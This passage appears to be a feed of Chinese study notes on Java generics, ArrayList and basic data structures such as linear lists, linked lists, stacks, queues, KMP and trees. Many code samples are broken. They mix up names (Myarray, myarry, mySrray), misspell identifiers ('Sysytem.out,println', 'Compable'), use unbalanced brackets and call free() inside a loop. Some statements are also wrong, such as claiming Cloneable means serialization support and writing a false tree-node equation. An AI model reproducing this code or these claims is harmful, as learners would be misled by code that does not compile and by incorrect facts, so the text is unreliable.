title="引出泛型"></a>引出泛型</h4><p><strong><T>代表当前类是泛型类</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyArray</span>&#123;</span><br><span class="line">  <span class="keyword">public</span> Object[] array = <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">10</span>];</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">set</span><span class="params">(<span class="type">int</span> pos,Object val)</span>&#123;</span><br><span class="line">      array[pos] = val;</span><br><span class="line">  &#125;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(<span class="type">int</span> pos)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> array[pos];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Test&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">            <span class="type">Myarray</span> <span class="variable">myarry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Myarray</span>();</span><br><span class="line">            myArray.set(<span class="number">0</span>,<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">            myArray.set(<span class="number">1</span>,<span class="number">90</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> myArray.get(<span class="number">0</span>);</span><br><span class="line">       <span class="comment">//报错 get方法的返回值 是Object 父类给子类需要强转</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span>（String）myArray.get(<span class="number">0</span>);</span><br><span class="line">            System.out.println(str);</span><br><span class="line">        &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyArray</span>&lt;T&gt;&#123;</span><br><span class="line">  <span class="keyword">public</span> Object[] array = <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">10</span>];</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">set</span><span class="params">(<span class="type">int</span> pos,T val)</span>&#123;</span><br><span class="line">      array[pos] = val;</span><br><span class="line">  &#125;</span><br><span class="line">    <span class="keyword">public</span> T <span class="title function_">get</span><span class="params">(<span class="type">int</span> pos)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (T)array[pos];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Test&#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">       Myarray&lt;String&gt; myarry = <span class="keyword">new</span> <span class="title class_">Myarray</span>&lt;&gt;();</span><br><span class="line">            myArray.set(<span class="number">0</span>,<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">           <span class="comment">//myArray.set(1,90);</span></span><br><span class="line">           <span class="comment">//这里就不能放整型了</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> myArray.get(<span class="number">0</span>);<span class="comment">//不用强转</span></span><br><span class="line">            System.out.println(str);</span><br><span class="line">        &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然数组是Object类型的元素 但是return强转为T类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyArray</span>&lt;T&gt;&#123;</span><br><span class="line">  <span class="keyword">public</span> Object[] array = <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">10</span>];</span><br><span class="line">  <span class="comment">//建议的写法</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">set</span><span class="params">(<span class="type">int</span> pos,T val)</span>&#123;</span><br><span class="line">      array[pos] = val;</span><br><span class="line">  &#125;</span><br><span class="line">    <span class="keyword">public</span> T <span class="title function_">get</span><span class="params">(<span class="type">int</span> pos)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (T)array[pos];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Test&#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">       Myarray&lt;String&gt; myarry = <span class="keyword">new</span> <span class="title class_">Myarray</span>&lt;&gt;();</span><br><span class="line">            myArray.set(<span class="number">0</span>,<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">           <span class="comment">//myArray.set(1,90);</span></span><br><span class="line">           <span class="comment">//这里就不能放整型了</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> myArray.get(<span class="number">0</span>);<span class="comment">//不用强转</span></span><br><span class="line">            System.out.println(str);</span><br><span class="line">           </span><br><span class="line">      MyArray&lt;Integer&gt; myArray2 = <span class="keyword">new</span> <span class="title class_">AyArray</span>&lt;&gt;();</span><br><span class="line">      </span><br><span class="line">           MyArray2.set(<span class="number">1</span>,<span class="number">11</span>);</span><br><span class="line">           MyArray2.set(<span class="number">1</span>,<span class="string">&quot;123&quot;</span>);<span class="comment">//报错 使用泛型编译器辅助检查 只能使用传参给T类型的参数</span></span><br><span class="line"></span><br><span class="line">           <span class="type">Integer</span> <span class="variable">a</span> <span class="operator">=</span> mySrray.get(<span class="number">0</span>);</span><br><span class="line">           Sysytem.out,println(a);<span class="comment">//可直接打印</span></span><br><span class="line">       &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="泛型的主要目的"><a href="#泛型的主要目的" class="headerlink" title="泛型的主要目的"></a>泛型的主要目的</h4><p>指定当前容器 要持有什么类型的对象 让编译器去检查</p><p>泛型中不允许 实例化一个类型的数组</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> T[] array = <span class="keyword">new</span> <span class="title class_">T</span>[<span class="number">10</span>];</span><br><span class="line"><span class="comment">//报错</span></span><br><span class="line"><span class="keyword">public</span> T[] array = <span class="keyword">new</span> (T[])Object[<span class="number">10</span>];<span class="comment">//不一定好 报警告</span></span><br></pre></td></tr></table></figure><hr><p><strong>泛型只接收类</strong> <strong>基本数据类型必须使用包装类</strong><br>&lt;&gt;中只能是引用类型 不能是基本类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MyArray &lt;<span class="type">int</span>&gt;myArry = <span class="keyword">new</span> <span class="title class_">AyArray</span>&lt;&gt;();<span class="comment">//x</span></span><br><span class="line">MyArray &lt;Integer&gt;myArry = <span class="keyword">new</span> <span class="title class_">AyArray</span>&lt;&gt;();<span class="comment">//v</span></span><br></pre></td></tr></table></figure><h4 id="泛型是如何编译的"><a href="#泛型是如何编译的" class="headerlink" title="泛型是如何编译的"></a>泛型是如何编译的</h4><p> 编译的时候 将所有的T擦除为Object 运行时 没有泛型这样的概念【泛型的擦除机制只存在于编译期间】 </p><h4 id="泛型的上界（extends-拓展）"><a href="#泛型的上界（extends-拓展）" class="headerlink" title="泛型的上界（extends 拓展）"></a>泛型的上界（extends 拓展）</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyArray</span>&lt;T <span class="keyword">extends</span> <span class="title class_">Number</span>&gt;&#123;</span><br><span class="line"></span><br><span class="line">&#125;<span class="comment">//Number为上界 一定为T的父类</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Alg</span>&lt;T <span class="keyword">extends</span> <span class="title class_">Compable</span>&lt;T&gt;&gt;&#123;<span class="comment">//T一定实现compareable接口</span></span><br><span class="line">   <span class="keyword">public</span> T <span class="title function_">findMax</span><span class="params">(T[] array]&#123;</span></span><br><span class="line"><span class="params">       T max = array[<span class="number">0</span>];</span></span><br><span class="line"><span class="params">   <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; array.length; i++)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(array[i].compareTo(max)&gt; <span class="number">0</span>)&#123;</span><br><span class="line">             max = arry[i];</span><br><span class="line">        &#125;</span><br><span class="line">   &#125;</span><br><span class="line">          <span class="keyword">return</span> max;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line">                    </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Alg&lt;Integer&gt; alg = <span class="keyword">new</span> <span class="title class_">Alg</span>&lt;&gt;();</span><br><span class="line">        Integer[] array = &#123;<span class="number">5</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">8</span>&#125;;</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">ret</span> <span class="operator">=</span> alg.findMax(arry);</span><br><span class="line">        System.out.println(ret);</span><br><span class="line">        <span class="comment">//return 9</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="泛型方法"><a href="#泛型方法" class="headerlink" title="泛型方法"></a>泛型方法</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Alg</span>&#123;</span><br><span class="line">   <span class="keyword">public</span>&lt;T <span class="keyword">extends</span> <span class="title class_">Comparable</span>&lt;T&gt;&gt; T <span class="title function_">findMax</span><span class="params">(T[] array]&#123;</span></span><br><span class="line"><span class="params">       T max = array[<span class="number">0</span>];</span></span><br><span class="line"><span class="params">   <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; array.length; i++)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(array[i].compareTo(max)&gt; <span class="number">0</span>)&#123;</span><br><span class="line">             max = arry[i];</span><br><span class="line">        &#125;</span><br><span class="line">   &#125;</span><br><span class="line">          <span class="keyword">return</span> max;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line">                                             </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Alg</span> <span class="variable">alg</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Alg</span>();</span><br><span class="line">        Integer[] array = &#123;<span class="number">5</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">8</span>&#125;;</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">ret</span> <span class="operator">=</span> alg.findMax(arry);</span><br><span class="line">        System.out.println(ret);</span><br><span class="line">        <span class="comment">//return 9</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;                                 </span><br></pre></td></tr></table></figure><p><strong>静态</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Alg</span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> &lt;T <span class="keyword">extends</span> <span class="title class_">Comparable</span>&lt;T&gt;&gt; T <span class="title function_">findMax</span><span class="params">(T[] array]&#123;</span></span><br><span class="line"><span class="params">       T max = array[<span class="number">0</span>];</span></span><br><span class="line"><span class="params">   <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; array.length; i++)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(array[i].compareTo(max)&gt; <span class="number">0</span>)&#123;</span><br><span class="line">             max = arry[i];</span><br><span class="line">        &#125;</span><br><span class="line">   &#125;</span><br><span class="line">          <span class="keyword">return</span> max;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line">                                             </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Integer[] array = &#123;<span class="number">5</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">8</span>&#125;;</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">ret</span> <span class="operator">=</span> Alg.findMax(arry);</span><br><span class="line">        System.out.println(ret);</span><br><span class="line">        <span class="comment">//return 9</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;       </span><br></pre></td></tr></table></figure><h3 id="List接口"><a href="#List接口" class="headerlink" title="List接口"></a>List接口</h3><p>继承Collection Collection继承于Iterable</p><p>线性表 n个具有相同类型元素的有限序列 在该序列上额可以执行增删改查以及变量等操作</p><p><strong>List是个接口 不能用来实例化 在集合框架中 ArrayList和LinkedList都实现了List接口</strong><br>equals  返回值true&#x2F;false<br>compareto 比较大于小于等于</p><p>数组中的引用类型需要逐个滞空</p><h5 id="ArrayList的用法"><a href="#ArrayList的用法" class="headerlink" title="ArrayList的用法"></a>ArrayList的用法</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">    ArrayList&lt;Integer&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="comment">//调用的方法更多 </span></span><br><span class="line">   List&lt;Integer&gt; list2 = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">  <span class="comment">// 一个接口引用一个具体的实现类 可以发生向上转型但只能调用List接口类方法</span></span><br><span class="line">  list2.add(<span class="number">1</span>);<span class="comment">//默认放到数组最后一个位置 默认++</span></span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>1.ArrayLIist是以泛型的方式实现的 使用时必须先实例化<br>2.ArrayList实现了RandomAccess接口 表明ArrayList支持随机访问<br>3.ArrayList实现了Cloneable接口 表明ArrayList支持序列化<br>4.ArrayList实现了Serializable接口，表明ArrayList是支持序列化的<br>5.和Vector不同 ArrayList不是线程安全的 在单线程下可以使用  在多线程中可以选择Vector或者CopyOnWriteArrayList<br>6.ArrayList底层是一段连续的空间 可以动态扩容 是一个动态类型的顺序表</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java 知识碎片 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构</title>
      <link href="/2024/01/09/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%A2%8E%E7%89%87/"/>
      <url>/2024/01/09/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%A2%8E%E7%89%87/</url>
      
        <content type="html"><![CDATA[<h2 id="数据结构碎片"><a href="#数据结构碎片" class="headerlink" title="数据结构碎片"></a>数据结构碎片</h2><h5 id="一元多项式"><a href="#一元多项式" class="headerlink" title="一元多项式"></a>一元多项式</h5><p>简单数组表示 存储系数和指数，一一对应，运算即分类操作既可<br><img src="https://gitee.com/bobonie/couldimages/raw/master/img/image-20231123131613823.png" alt="image-20231123131613823"></p><h5 id="稀疏多项式"><a href="#稀疏多项式" class="headerlink" title="稀疏多项式"></a>稀疏多项式</h5><p> 记录系数不为零的项 每一项的系数和指数也构成线性表（先系数再指数）</p><p><strong>稀疏多项式的运算</strong></p><p>新开设新数组C（第三个数组相当于中间存储） </p><p>从头开始遍历比较a和b的每一项<br>指数相同 对应系数相加，和不为0，C中新增加新项;和为0，去掉 即可</p><p>指数不相同，将指数较小的项复制到C中</p><p><u>一个多项式已遍历完毕时，将另一个剩余项依次复制到C中即可 </u></p><p><strong>顺序存储存在的问题</strong></p><p>1.存储空间分配不灵活<br>2.运算的空间复杂度高</p><h5 id="链式存储解决稀疏多项式"><a href="#链式存储解决稀疏多项式" class="headerlink" title="链式存储解决稀疏多项式"></a>链式存储解决稀疏多项式</h5><p><img src="https://gitee.com/bobonie/couldimages/raw/master/img/image-20231123132146214.png" alt="image-20231123132146214"></p><h5 id="线性表中的数据元素的类型可以是简单-复杂类型"><a href="#线性表中的数据元素的类型可以是简单-复杂类型" class="headerlink" title="线性表中的数据元素的类型可以是简单&#x2F;复杂类型"></a><strong>线性表中的数据元素的类型可以是简单&#x2F;复杂类型</strong></h5><h3 id="线性表的定义类型"><a href="#线性表的定义类型" class="headerlink" title="线性表的定义类型"></a>线性表的定义类型</h3><h5 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h5><p>InitList(&amp;L)<br>操作结果：构造一个空链表</p><p>DestroyList(&amp;L)<br>初始条件：线性表L已经存在<br>操作结果：销毁线性表L</p><p>ClearList(&amp;L)<br>初始条件：线性表L已经存在<br>操作结果：将线性表L重置为空表</p><p>ListEmpty(L)<br>初始条件：线性表已经存在<br>操作结果：若L为空返回TRUE,否则返回FALSE</p><p>ListLength(L)<br>初始条件：线性表已经存在<br>操作结果：返回L中数据元素个数</p><p>GetElem(L,i,&amp;e)<br>初始条件：线性表L已经存在，1&lt;&#x3D;i&lt;&#x3D;ListLength(L)<br>操作结果： 用e返回线性表L中第i个数据的值</p><p>LocateElem（L，e，compare（））<br>初始条件：线性表L已经存在，compare（）是数据元素判定函数<br>操作结果：返回L中第1个与e满足compare（）的数据元素的位序。如不存在这样的数据元素则返回0.  </p><p>PriorElem(L,cur_e,&amp;pre_e)<br>初始条件：线性表L已经存在<br>操作结果：若cur_e是L的数据元素且不是第一个，则用pre_e返回它的前驱否则操作失败，pre_e无意义</p><p>NextElem(L,cur_e,&amp;next_e)<br>初始条件：线性表L已经存在<br>操作结果：若cur_e是L的数据元素且不是最后一个，则用next_e返回它的前驱否则操作失败，next_e无意义</p><p>ListInsert(&amp;L,i,e)<br>初始条件：L已存在，1&lt;&#x3D;i&lt;&#x3D;ListLength(L)+1<br>操作结果：在L的第i个位置插入新的元素e，L长度+1<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231127113252697.png" alt="image-20231127113252697"></p><p>ListDelete(&amp;L,i,e)<br>初始条件：L已经存在，1&lt;&#x3D;i&lt;&#x3D;ListLength(L)<br>操作结果：删除L的第i个数据，并用e返回其值，L长度-1</p><p>ListTraverse(&amp;L,visited())<br>初始条件：L已经存在<br>操作结果：依次对线性表中每个元素调用visited（）</p><p><strong>抽象数据类型线性表的定义</strong><br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231204104700401.png" alt="image-20231204104700401"></p><h4 id="线性表的顺序存储结构"><a href="#线性表的顺序存储结构" class="headerlink" title="线性表的顺序存储结构"></a>线性表的顺序存储结构</h4><p><strong>典例：一维数组</strong></p><p>定义：把逻辑上相邻的数据元素存储在物理相邻的存储单元中的存储结构。<br><strong>占用一块连续的存储空间方便计算得出其他元素的存储位置</strong><br><u>loc（ai）&#x3D;loc（a1）+（i-1）</u>×l（存储单元长度）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> LIST _INIT_SIZE 100<span class="comment">//线性存储空间的初始分配量</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line"> ElemType elem[LIST_INIT_SIZE];</span><br><span class="line"> <span class="type">int</span> length;<span class="comment">//当前长度</span></span><br><span class="line">&#125;SqList;</span><br></pre></td></tr></table></figure><h3 id="数组模拟单链表"><a href="#数组模拟单链表" class="headerlink" title="数组模拟单链表"></a>数组模拟单链表</h3><p>邻接表（最常用）<br>存储图和树<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20230911185245253.png" alt="image-20230911185245253"></p><p>空节点下标用-1表示<br>联邦每个节点存储两个值：内容和指向下一节点指针</p><h4 id="顺序表的插入"><a href="#顺序表的插入" class="headerlink" title="顺序表的插入"></a>顺序表的插入</h4><p>三步骤：<br>从后往前赋值<br>对目标位置进行赋值<br>列表长度+1</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = L.length;j&gt;=i;j--)<span class="comment">//让j=当前列表长度，i后的数据依次后移</span></span><br><span class="line">&#123;</span><br><span class="line">L.data[j] = L.data[j<span class="number">-1</span>];</span><br><span class="line">&#125;</span><br><span class="line">L.data[i<span class="number">-1</span>] = e;<span class="comment">//让第i个数=e，但数组下标-</span></span><br><span class="line">L.length++;<span class="comment">//插入一个后，表的原有长度+1</span></span><br></pre></td></tr></table></figure><h4 id="顺序表的删除"><a href="#顺序表的删除" class="headerlink" title="顺序表的删除"></a>顺序表的删除</h4><p>三步骤：<br>被删除的目标元素赋值给e<br>把第i个位置的元素前移<br>列表长度-1</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">e = L.data[i];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = i;j&lt;L.length;j++)&#123;</span><br><span class="line">L.data[j<span class="number">-1</span>] = L.data[j];</span><br><span class="line">&#125;</span><br><span class="line">L.length--;</span><br></pre></td></tr></table></figure><h4 id="单链表的头插法（逆序）和尾插法（正序）"><a href="#单链表的头插法（逆序）和尾插法（正序）" class="headerlink" title="单链表的头插法（逆序）和尾插法（正序）"></a>单链表的头插法（逆序）和尾插法（正序）</h4><p><img src="https://gitee.com/bobonie/couldimages/raw/master/img/image-20231224235713856.png" alt="image-20231224235713856"></p><p><img src="https://gitee.com/bobonie/couldimages/raw/master/img/image-20231224235737641.png" alt="image-20231224235737641"></p><h4 id="单链表的删除"><a href="#单链表的删除" class="headerlink" title="单链表的删除"></a>单链表的删除</h4><p>1.找点要删除单链表的父节点<br>2.待删除节点的父节点&#x3D;待删除节点的字节点<br>3.释放节点</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231225105201271.png" alt="image-20231225105201271"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Node prev = dummyHead;<span class="comment">//指向头节点</span></span><br><span class="line"><span class="keyword">for</span>（<span class="type">int</span> i = <span class="number">0</span>;i &lt; index; i++）&#123;</span><br><span class="line">prev = pev.next;</span><br><span class="line">NodeHead retNode = prev.next;<span class="comment">//retNode为待删除节点</span></span><br><span class="line">prev.next = retNode.next;<span class="comment">//删除节点</span></span><br><span class="line"><span class="built_in">free</span>(retNode);<span class="comment">//释放节点</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="双向链表的插入和删除"><a href="#双向链表的插入和删除" class="headerlink" title="双向链表的插入和删除"></a>双向链表的插入和删除</h3><p>1.插入<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231225105902718.png" alt="image-20231225105902718"></p><p>p节点保留相应信息<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231225110235205.png" alt="image-20231225110235205"></p><h3 id="入栈和出栈"><a href="#入栈和出栈" class="headerlink" title="入栈和出栈"></a>入栈和出栈</h3><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231225110728355.png" alt="image-20231225110728355"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231225110638880.png" alt="image-20231225110638880"></p><h4 id="队列的入队和出队"><a href="#队列的入队和出队" class="headerlink" title="队列的入队和出队"></a>队列的入队和出队</h4><p>队列特点：先进先出<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231226105602978.png" alt="image-20231226105602978"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231226105828912.png" alt="image-20231226105828912"></p><h4 id="next数组求解"><a href="#next数组求解" class="headerlink" title="next数组求解"></a>next数组求解</h4><p>KMP算法</p><p>next[i] &#x3D; 最近匹配字符个数+1<br>正常第一位数从0开始<img src="https://cdn.jsdelivr.net/gh/yubut/First@main/QQ%E6%88%AA%E5%9B%BE20231227093954.png" alt="QQ截图20231227093954"></p><h4 id="nextval数组求解"><a href="#nextval数组求解" class="headerlink" title="nextval数组求解"></a>nextval数组求解</h4><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231227094200599.png" alt="image-20231227094200599"></p><h4 id="树节点的计算"><a href="#树节点的计算" class="headerlink" title="树节点的计算"></a>树节点的计算</h4><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231227094234032.png" alt="image-20231227094234032"></p><p>树总结点N &#x3D; 度数✖对应接节点个数+1（根节点）<br>上图N &#x3D; 3a+2b+c+1 &#x3D; a+b+c+1<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231227094253091.png" alt="image-20231227094253091"></p><h4 id="满二叉树和完全二叉树"><a href="#满二叉树和完全二叉树" class="headerlink" title="满二叉树和完全二叉树"></a>满二叉树和完全二叉树</h4><h5 id="满二叉树"><a href="#满二叉树" class="headerlink" 